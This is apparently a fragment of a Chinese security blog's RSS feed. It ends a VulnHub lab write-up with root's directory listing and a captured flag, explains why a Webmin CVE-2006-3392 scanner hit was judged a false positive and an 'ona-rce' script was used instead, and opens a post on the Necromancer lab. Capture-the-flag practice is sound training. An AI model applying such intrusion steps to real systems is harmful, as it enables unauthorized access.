+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="m"&gt;262152&lt;/span&gt; drwx------ &lt;span class="m"&gt;3&lt;/span&gt; root root 4.0K Jan &lt;span class="m"&gt;1&lt;/span&gt; &lt;span class="m"&gt;2020&lt;/span&gt; .
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; &lt;span class="m"&gt;2&lt;/span&gt; drwxr-xr-x &lt;span class="m"&gt;18&lt;/span&gt; root root 4.0K Dec &lt;span class="m"&gt;31&lt;/span&gt; &lt;span class="m"&gt;2019&lt;/span&gt; ..
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="m"&gt;266111&lt;/span&gt; lrwxrwxrwx &lt;span class="m"&gt;1&lt;/span&gt; root root &lt;span class="m"&gt;9&lt;/span&gt; Dec &lt;span class="m"&gt;31&lt;/span&gt; &lt;span class="m"&gt;2019&lt;/span&gt; .bash_history -&amp;gt; /dev/null
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="m"&gt;262372&lt;/span&gt; -rw-r--r-- &lt;span class="m"&gt;1&lt;/span&gt; root root &lt;span class="m"&gt;570&lt;/span&gt; Jan &lt;span class="m"&gt;31&lt;/span&gt; &lt;span class="m"&gt;2010&lt;/span&gt; .bashrc
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="m"&gt;262387&lt;/span&gt; -rwx------ &lt;span class="m"&gt;1&lt;/span&gt; root root &lt;span class="m"&gt;33&lt;/span&gt; Jan &lt;span class="m"&gt;1&lt;/span&gt; &lt;span class="m"&gt;2020&lt;/span&gt; flag.txt
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="m"&gt;295523&lt;/span&gt; drwxr-xr-x &lt;span class="m"&gt;3&lt;/span&gt; root root 4.0K Jan &lt;span class="m"&gt;1&lt;/span&gt; &lt;span class="m"&gt;2020&lt;/span&gt; .local
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="m"&gt;262371&lt;/span&gt; -rw-r--r-- &lt;span class="m"&gt;1&lt;/span&gt; root root &lt;span class="m"&gt;148&lt;/span&gt; Aug &lt;span class="m"&gt;17&lt;/span&gt; &lt;span class="m"&gt;2015&lt;/span&gt; .profile
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="c1"&gt;# cat flag.txt&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;8f3b38dd95eccf600593da4522251746
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;h2 id="为什么没有利用10000端口的服务"&gt;为什么没有利用10000端口的服务
+&lt;/h2&gt;&lt;p&gt;Nmap http-vuln-cve2006-3392 报 VULNERABLE，但目标 Webmin 1.920 不受 CVE-2006-3392 影响，判断为误报，未利用，因此我转头用了ona-rce脚本&lt;/p&gt;</description></item><item><title>Necromancer Vulunhub靶场复现</title><link>https://ke1thli.github.io/p/necromancer-vulunhub%E9%9D%B6%E5%9C%BA%E5%A4%8D%E7%8E%B0/</link><pubDate>Wed, 07 Oct 2026 00:00:00 +0000</pubDate><guid>https://ke1thli.github.io/p/necromancer-vulunhub%E9%9D%B6%E5%9C%BA%E5%A4%8D%E7%8E%B0/</guid><description>&lt;h1 id="necromancer-vulnhub靶场复现"&gt;Necromancer VulnHub靶场复现
 &lt;/h1&gt;&lt;h2 id="靶场介绍"&gt;靶场介绍
 &lt;/h2&gt;&lt;p&gt;靶场地址 &lt;a class="link" href="https://www.vulnhub.com/entry/the-necromancer-1,154/" target="_blank" rel="noopener"
  &gt;https://www.vulnhub.com/entry/the-necromancer-1,154/&lt;/a&gt;&lt;/p&gt;
